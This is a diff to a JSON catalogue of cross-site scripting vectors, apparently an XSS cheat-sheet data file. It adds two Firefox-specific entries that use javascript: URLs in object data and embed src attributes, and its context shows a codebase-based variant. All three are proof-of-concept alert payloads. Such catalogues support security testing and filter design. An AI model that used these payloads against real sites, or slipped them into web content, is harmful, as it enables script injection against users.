@@ -202,6 +202,16 @@
     "browsers": ["safari"]
   },
   {
+    "description": "Object data attribute with JavaScript protocol in Firefox 140 and below",
+    "code": "<object data=\"javascript:alert(1)\">",
+    "browsers": ["firefox"]
+  },
+  {
+    "description": "Embed src attribute with JavaScript protocol in Firefox 140 and below",
+    "code": "<embed src=\"javascript:alert(1)\">",
+    "browsers": ["firefox"]
+  },
+  {
     "description": "Object data and codebase in Firefox v140 and below",
     "code": "<object data=# codebase=javascript:alert(document.domain)//>",
     "browsers": ["firefox"]
